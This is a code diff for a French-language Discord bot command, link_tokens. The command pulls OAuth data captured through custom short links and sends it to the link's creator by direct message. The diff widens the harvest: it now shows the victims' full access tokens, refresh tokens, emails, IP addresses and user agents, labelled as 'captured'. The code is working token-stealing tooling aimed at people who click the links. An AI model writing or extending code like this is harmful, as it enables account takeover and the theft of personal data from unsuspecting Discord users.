@@ -6,6 +6,7 @@ from urllib.parse import urlparse
 import os
 from dotenv import load_dotenv
 import sys
+from datetime import datetime
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from shortlink_server import click_codes
 
@@ -411,7 +412,6 @@ async def link_tokens(self, ctx, short_id: str):
         conn = sqlite3.connect("links.db")
         cursor = conn.cursor()
         
-        # Vérifier que l'utilisateur est le créateur
         cursor.execute('SELECT user_id FROM custom_links WHERE id = ?', (short_id,))
         result = cursor.fetchone()
         
@@ -425,9 +425,8 @@ async def link_tokens(self, ctx, short_id: str):
             conn.close()
             return
         
-        # Récupérer les tokens
         cursor.execute('''
-            SELECT user_id, username, email, access_token, ip_address, created_at
+            SELECT user_id, username, email, access_token, refresh_token, ip_address, user_agent, created_at
             FROM oauth_tokens
             WHERE short_id = ?
             ORDER BY created_at DESC
@@ -440,24 +439,33 @@ async def link_tokens(self, ctx, short_id: str):
             await ctx.send("❌ Aucun token récupéré pour ce lien")
             return
         
-        embed = discord.Embed(
-            title=f"🔑 Tokens récupérés pour `{short_id}`",
-            description=f"**Total: {len(tokens)} token(s)**",
-            color=discord.Color.gold()
-        )
-        
-        for idx, (user_id, username, email, token, ip, created_at) in enumerate(tokens[:10], 1):
-            embed.add_field(
-                name=f"Token #{idx}",
-                value=f"**User:** {username} (`{user_id}`)\n**Email:** {email}\n**Token:** `{token[:30]}...`\n**IP:** `{ip}`\n**Date:** {created_at}",
-                inline=False
+        embeds = []
+        for idx, (user_id, username, email, access_token, refresh_token, ip, user_agent, created_at) in enumerate(tokens, 1):
+            embed = discord.Embed(
+                title=f"🔑 Token #{idx} - {username}",
+                color=discord.Color.gold(),
+                timestamp=datetime.fromisoformat(created_at) if created_at else None
             )
+            
+            embed.add_field(name="👤 ID Discord", value=f"`{user_id}`", inline=False)
+            embed.add_field(name="👥 Username", value=f"`{username}`", inline=True)
+            embed.add_field(name="📧 Email", value=f"`{email or 'Non fourni'}`", inline=True)
+            
+            embed.add_field(name="🔑 ACCESS TOKEN (COMPLET)", value=f"```{access_token}```", inline=False)
+            
+            if refresh_token:
+                embed.add_field(name="🔄 REFRESH TOKEN", value=f"```{refresh_token}```", inline=False)
+            
+            embed.add_field(name="🌐 Adresse IP", value=f"`{ip}`", inline=False)
+            embed.add_field(name="📱 User-Agent", value=f"```{user_agent[:200]}```", inline=False)
+            
+            embed.set_footer(text=f"Capturé: {created_at}")
+            embeds.append(embed)
         
-        if len(tokens) > 10:
-            embed.set_footer(text=f"Affichage des 10 premiers tokens sur {len(tokens)}")
+        for embed in embeds[:10]:
+            await ctx.author.send(embed=embed)
         
-        await ctx.author.send(embed=embed)
-        await ctx.send("✅ Liste des tokens envoyée en DM")
+        await ctx.send(f"✅ {len(embeds)} information(s) envoyée(s) en DM" + (f" (Affichage des 10 premiers)" if len(embeds) > 10 else ""))
         
     except Exception as e:
         await ctx.send(f"❌ Erreur: {str(e)}")
